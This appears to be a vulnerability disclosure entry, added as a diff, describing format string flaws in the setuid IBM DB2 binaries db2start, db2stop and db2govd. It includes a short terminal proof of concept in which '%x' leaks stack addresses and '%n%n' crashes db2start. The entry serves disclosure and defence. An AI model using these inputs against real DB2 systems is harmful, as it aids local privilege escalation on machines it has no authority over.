@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/8989/info
+
+Multiple command-line parameter format string vulnerabilities have been discovered in various IBM DB2 binaries. Specifically, format-based functions are implemented erroneously within the db2govd, db2start, and db2stop programs. These binaries are typically installed setuid. As a result, a malicious local user may be capable of gaining elevate privileges.
+
+[kf@RiotStarter adm]$ ./db2start %x
+SQL2032N The "bffff270" parameter is not valid.
+[kf@RiotStarter adm]$ ./db2start %n%n
+Segmentation fault
+[kf@RiotStarter adm]$ ./db2stop %x
+SQL2032N The "bffff6f0" parameter is not valid.
